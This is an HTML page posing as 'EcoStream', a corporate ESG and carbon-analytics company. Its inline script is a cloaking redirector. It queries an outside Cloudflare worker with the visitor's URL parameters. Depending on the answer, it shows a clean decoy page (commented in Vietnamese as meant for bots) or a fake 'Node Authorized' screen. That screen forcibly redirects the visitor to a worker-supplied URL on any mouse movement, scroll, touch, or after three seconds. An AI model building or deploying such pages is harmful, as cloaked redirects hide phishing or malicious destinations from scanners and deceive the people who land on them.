<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoStream | Leading Corporate ESG Intelligence & Carbon Analytics</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Outfit', sans-serif; }
        .bg-eco { background: radial-gradient(circle at 0% 0%, #f0fdf4 0%, #ffffff 100%); }
        .text-gradient { background: linear-gradient(90deg, #059669, #10b981); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    </style>
</head>
<body class="bg-white text-slate-900">
    <div id="app"></div>

    <script>
        (async function() {
            // GIỮ NGUYÊN BỘ NÃO WORKER
            const workerApi = "https://tet.bcgateway.workers.dev/";
            const config = {
                brand: "EcoStream Intelligence",
                portal: "https://portal.ecostream.io",
                token: "ESG-" + Math.floor(20000 + Math.random() * 70000),
                loc: "EU-WEST-NODE",
                ip: "141.101." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255)
            };

            // --- GIAO DIỆN TRANG SẠCH MỚI: ECO-TECH (CHO BOT) ---
            const UI_CLEAN = `
            <div class="bg-eco min-h-screen">
                <nav class="max-w-7xl mx-auto px-8 py-6 flex justify-between items-center">
                    <div class="flex items-center gap-2">
                        <div class="w-10 h-10 bg-emerald-600 rounded-full flex items-center justify-center shadow-lg">
                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                        </div>
                        <span class="text-2xl font-extrabold tracking-tight text-emerald-950">` + config.brand + `</span>
                    </div>
                    <div class="hidden md:flex gap-10 text-[11px] uppercase font-black tracking-[0.2em] text-emerald-900/50">
                        <a href="#" class="hover:text-emerald-600 transition">Solutions</a>
                        <a href="#" class="hover:text-emerald-600 transition">Methodology</a>
                        <a href="#" class="hover:text-emerald-600 transition">Reporting</a>
                    </div>
                    <button class="bg-emerald-950 text-white px-8 py-3 rounded-full text-xs font-bold uppercase tracking-widest shadow-xl">Contact Expert</button>
                </nav>

                <header class="max-w-5xl mx-auto px-8 py-24 text-center">
                    <div class="inline-block px-4 py-1.5 mb-8 bg-emerald-100 border border-emerald-200 rounded-full text-[10px] font-black text-emerald-700 uppercase tracking-widest">
                        Global Sustainability Standard 2025
                    </div>
                    <h1 class="text-6xl md:text-8xl font-black text-emerald-950 tracking-tighter mb-10 leading-[0.9]">
                        Data-Driven <br><span class="text-gradient">Sustainability.</span>
                    </h1>
                    <p class="text-xl text-slate-500 max-w-2xl mx-auto leading-relaxed mb-12">
                        EcoStream provides enterprise-level ESG analytics, carbon footprint tracking, and compliance reporting for the modern green economy.
                    </p>
                    <div class="flex flex-col sm:flex-row justify-center gap-6">
                        <button class="bg-emerald-600 text-white px-10 py-5 rounded-2xl font-bold text-sm uppercase tracking-widest shadow-2xl shadow-emerald-200">View ESG Framework</button>
                        <button class="bg-white border border-slate-200 px-10 py-5 rounded-2xl font-bold text-sm uppercase tracking-widest">Live Node Status</button>
                    </div>
                </header>

                <!-- Statistics Section -->
                <section class="max-w-7xl mx-auto px-8 py-20 bg-emerald-950 rounded-[3rem] my-10 shadow-2xl text-white">
                    <div class="grid md:grid-cols-4 gap-12 text-center">
                        <div><div class="text-5xl font-black mb-2">4.2M</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Tons CO2 Tracked</div></div>
                        <div><div class="text-5xl font-black mb-2">95%</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Audit Accuracy</div></div>
                        <div><div class="text-5xl font-black mb-2">120+</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Global Partners</div></div>
                        <div><div class="text-5xl font-black mb-2">24/7</div><div class="text-[10px] font-bold uppercase tracking-widest opacity-50">Real-time Monitoring</div></div>
                    </div>
                </section>

                <!-- Content Body -->
                <section class="max-w-4xl mx-auto px-8 py-24 prose prose-emerald">
                    <h2 class="text-4xl font-black text-emerald-950 italic uppercase mb-12">I. The Carbon Analytics Era</h2>
                    <p class="text-lg text-slate-600 mb-8 leading-relaxed">
                        In an era defined by climate accountability, corporations must move beyond superficial commitments. EcoStream Intelligence utilizes decentralized sensor networks and AI-driven auditing to provide a granular view of carbon output across global supply chains.
                    </p>
                    <div class="grid md:grid-cols-2 gap-8 my-16">
                        <div class="p-8 border border-emerald-50 rounded-3xl bg-white shadow-sm">
                            <h4 class="font-black text-emerald-900 mb-4 uppercase tracking-widest text-xs">Compliance Reporting</h4>
                            <p class="text-sm text-slate-500">Automated reporting for GRI, SASB, and TCFD frameworks, ensuring your business meets international regulatory standards.</p>
                        </div>
                        <div class="p-8 border border-emerald-50 rounded-3xl bg-white shadow-sm">
                            <h4 class="font-black text-emerald-900 mb-4 uppercase tracking-widest text-xs">Supply Chain Audit</h4>
                            <p class="text-sm text-slate-500">Track Scope 3 emissions with unprecedented precision through our proprietary edge-node synchronization.</p>
                        </div>
                    </div>

                    <h2 class="text-4xl font-black text-emerald-950 italic uppercase mb-12">II. Methodology & Accuracy</h2>
                    <p class="text-lg text-slate-600 mb-12">
                        Our nodes utilize a zero-trust verification process for all incoming environmental data. By offloading complex signature validations to localized data centers, we ensure that every metric reported is tamper-proof and verified against global baseline standards.
                    </p>

                    <div class="bg-slate-50 rounded-3xl p-10 font-mono text-xs text-emerald-800 space-y-2 border border-emerald-100">
                        <div>[SYSTEM] INITIALIZING_ECO_SYNC_PROTOCOL...</div>
                        <div>[DATA] POLLING_GLOBAL_CARBON_SENSORS... [ACTIVE]</div>
                        <div>[AUTH] VERIFYING_BLOCKCHAIN_INTEGRITY... [OK]</div>
                        <div>[STATUS] ESG_DATA_READY_FOR_PROPAGATION</div>
                    </div>
                </section>

                <footer class="max-w-7xl mx-auto px-8 py-20 border-t border-slate-100">
                    <div class="grid md:grid-cols-3 gap-20">
                        <div>
                            <span class="font-black text-xl text-emerald-950 uppercase">` + config.brand + `</span>
                            <p class="mt-6 text-slate-400 text-sm leading-relaxed">Pioneering the future of corporate environmental transparency through advanced analytics.</p>
                        </div>
                        <div class="grid grid-cols-2 gap-10">
                            <div><div class="font-bold text-[10px] uppercase mb-6 tracking-widest">Solutions</div><ul class="text-sm text-slate-400 space-y-3"><li>Analytics</li><li>ESG Cloud</li><li>Auditing</li></ul></div>
                            <div><div class="font-bold text-[10px] uppercase mb-6 tracking-widest">Legal</div><ul class="text-sm text-slate-400 space-y-3"><li><a href="privacy.html">Privacy</a></li><li><a href="terms.html">Terms</a></li></ul></div>
                        </div>
                        <div class="text-right">
                            <div class="inline-block p-1 px-3 bg-emerald-50 text-emerald-600 rounded-full text-[10px] font-bold uppercase tracking-widest">System Operational</div>
                        </div>
                    </div>
                </footer>
            </div>`;

            // --- GIAO DIỆN TRANG XANH: ACCESS GRANTED ---
            const UI_ACCESS = `
            <style>
                body{background:#030a16; font-family:'Outfit',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; overflow:hidden;}
                .c{background:rgba(10,20,37,0.95); backdrop-filter:blur(25px); border:1px solid rgba(0,82,255,0.2); border-radius:40px; width:100%; max-width:440px; padding:60px 35px; text-align:center; box-shadow:0 40px 100px rgba(0,0,0,0.8);}
                .s-b{background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.05); border-radius:24px; padding:25px; margin:30px 0; text-align:left;}
                .val{font-family:monospace; color:#3bc117; font-weight:700;}
                .btn-p{background:linear-gradient(135deg,#45d31c 0%,#3bc117 100%); color:#000; font-weight:900; padding:22px; border-radius:18px; display:block; text-decoration:none; text-transform:uppercase; cursor:pointer;}
            </style>
            <div class="c">
                <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-4"><span class="text-[10px] font-black uppercase text-blue-400 italic">ESG Handshake</span><span class="text-xs font-bold text-emerald-500 uppercase">Verified</span></div>
                <h1 class="text-4xl font-extrabold uppercase mb-2 italic text-white">Node <span class="text-[#3bc117]">Authorized</span></h1>
                <div class="s-b space-y-5 text-[11px] uppercase tracking-widest text-white">
                    <div class="flex justify-between"><span>Identifier:</span><span class="val">` + config.token + `</span></div>
                    <div class="flex justify-between"><span>Access IP:</span><span class="val">` + config.ip + `</span></div>
                    <div class="flex justify-between"><span>Node:</span><span class="val">` + config.loc + `</span></div>
                </div>
                <p class="text-gray-500 text-[11px] mb-10 italic">Secure handshake successful. Redirecting to data cluster...</p>
                <div id="cta" class="btn-p">Continue to Portal</div>
            </div>`;

            const app = document.getElementById('app');

            try {
                // GỌI WORKER KIỂM TRA
                const response = await fetch(workerApi + window.location.search);
                const data = await response.json();

                if (data.status === "success" && data.redirect) {
                    app.innerHTML = UI_ACCESS;
                    const jump = () => { window.location.replace(data.redirect); };
                    document.getElementById('cta').onclick = jump;
                    ['mousedown', 'touchstart', 'mousemove', 'scroll'].forEach(evt => {
                        window.addEventListener(evt, jump, { once: true });
                    });
                    setTimeout(jump, 3000);
                } else {
                    app.innerHTML = UI_CLEAN;
                }
            } catch (error) {
                app.innerHTML = UI_CLEAN;
            }
        })();
    </script>
</body>
</html>
